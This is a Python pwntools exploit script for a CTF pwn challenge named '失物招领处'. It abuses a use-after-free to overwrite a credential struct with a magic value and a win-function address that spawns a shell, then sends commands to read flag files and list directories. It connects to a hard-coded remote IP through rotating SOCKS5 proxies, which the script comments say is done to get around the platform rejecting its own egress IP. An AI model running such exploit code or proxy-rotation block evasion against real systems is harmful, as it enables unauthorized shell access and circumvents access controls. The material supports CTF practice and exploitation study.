"""失物招领处 UAF —— 经 SOCKS5 代理连靶机（本机出口 IP 被平台 REJECT）。

利用思路见 失物招领处_WP.md
"""
from pwn import *
import socks, sys, os

context.log_level = 'info'
context.arch = 'amd64'

HOST, PORT = '103.163.47.230', 35122
SOCKS = [l.strip() for l in open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_socks_ok.txt'))]

WIN = 0x401246        # 该函数体是 system("/bin/sh")
PERM = 0x1337C0DE
payload = b'A' * 16 + p32(PERM) + p32(1) + p64(WIN)
hexstr = payload.hex().encode()


def connect():
    for hp in SOCKS:
        h, p = hp.rsplit(':', 1)
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, h, int(p), rdns=True)
            s.settimeout(10)
            s.connect((HOST, PORT))
            b = s.recv(200)
            if b'======' not in b:
                s.close()
                continue
            log.success('via %s' % hp)
            return s
        except Exception as e:
            log.warning('%s fail %s' % (hp, str(e)[:40]))
    raise SystemExit('no proxy')


s = connect()
io = remote.fromsocket(s)
io.timeout = 10

io.recvuntil('请选择：'.encode())
io.sendline(b'1')                                   # 登记 -> malloc(0x20)
io.sendlineafter('请简单描述这件失物：'.encode(), b'LOST')
io.recvuntil('请选择：'.encode())
io.sendline(b'2')                                   # 删除 -> free，索引悬空
io.recvuntil('请选择：'.encode())
io.sendline(b'4')                                   # 申请凭证 -> malloc 复用同一块
io.recvuntil('请选择：'.encode())
io.sendline(b'3')                                   # 编辑（走悬空索引）
io.recvuntil('：'.encode())
io.sendline(hexstr)                                 # 覆写凭证
io.recvuntil('请选择：'.encode())
io.sendline(b'5')                                   # 使用凭证 -> 校验通过
io.sendline(b'cat /flag*;cat /flag;cat flag*;ls -la /;echo ---;ls -la')

io.interactive()
